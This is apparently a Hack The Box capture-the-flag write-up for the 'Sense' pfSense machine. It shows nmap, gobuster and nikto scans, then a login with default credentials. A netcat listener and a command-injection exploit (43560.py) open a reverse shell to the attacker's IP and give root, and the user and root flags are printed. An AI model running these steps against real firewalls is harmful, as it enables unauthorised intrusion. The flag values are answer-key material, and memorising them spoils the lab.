### IP
`10.10.10.60`

# Recon

### nmap
`nmap -sC -sV 10.10.10.60 -oN Sense.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-25 05:13 EST
Nmap scan report for 10.10.10.60
Host is up (0.12s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE    VERSION
80/tcp  open  http       lighttpd 1.4.35
|_http-server-header: lighttpd/1.4.35
|_http-title: Did not follow redirect to https://10.10.10.60/
|_https-redirect: ERROR: Script execution failed (use -d to debug)
443/tcp open  ssl/https?
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.18 seconds
```
* Looks like we have port 443, which when logging into the website, verifies that we get redirected to https

### inspect element
* Looking at the source code of the site, we can see `pfsense` in many of the directories listed
	* Makes sense considering this box is called "Sense"

### gobuster
`gobuster dir -u https://10.10.10.60/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,sh -k -o gobusterScan.txt`
* I didn't scan for php extensions because gobuster looked like it was giving a 200 for all of them
* The `-k` is to ignore ssl verification (since we're going through https)
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            https://10.10.10.60/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     txt
[+] Timeout:        10s
===============================================================
2020/11/25 19:38:38 Starting gobuster
===============================================================
/themes (Status: 301)
/css (Status: 301)
/includes (Status: 301)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/widgets (Status: 301)
/tree (Status: 301)
/shortcuts (Status: 301)
/installer (Status: 301)
/wizards (Status: 301)
/csrf (Status: 301)
/system-users.txt (Status: 200)
/filebrowser (Status: 301)
/%7Echeckout%7E (Status: 403)
===============================================================
2020/11/25 20:28:11 Finished
===============================================================
```








* `/changelog.txt` tells us that there is one vulnerability that hasn't been patched as a result of a failed update
* `/system-users.txt` tells us there should be a username `rohit` with the default company password
	* [This](https://docs.netgate.com/pfsense/en/latest/usermanager/defaults.html#:~:text=The%20default%20credentials%20for%20a,Password%3A%20pfsense) shows us that the default password is `pfsense`

* Logging in confirms that this is pfsense version 2.1.3

### nikto
`nikto -host 10.10.10.60`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.60
+ Target Hostname:    10.10.10.60
+ Target Port:        80
+ Start Time:         2020-11-25 17:57:32 (GMT-5)
---------------------------------------------------------------------------
+ Server: lighttpd/1.4.35
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Root page / redirects to: https://10.10.10.60/
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Cookie PHPSESSID created without the httponly flag
+ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
+ 7863 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2020-11-25 18:13:42 (GMT-5) (970 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* Looks we're running on lighttpd version 1.4.35
	* According to [this](https://www.cybersecurity-help.cz/vdb/SB2018110801), that means we can get directory traversal

# Exploitation

### reverse shell

* Using searchsploit, I found an exploit that seemed to work well labeled "pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection | php/webapps/43560.py"
* Downloading it, I can first set up a listener on my system with `nc -lvnp 1337`
* Then I can run the exploit with `python3 43560.py --rhost 10.10.10.60 --lhost 10.10.14.12 --lport 1337 --username rohit --password pfsense`
	* It works! (and we get root access immediately)

* If we `cd /home/rohit/` we can `cat user.txt` to get the user flag: `8721327cc232073b40d27d9c17e7348b`
* If we `cd /root/` we can `cat root.txt` to get the root flag: `d08c32a5d4f8c8b10e76eb51a69f1a86`
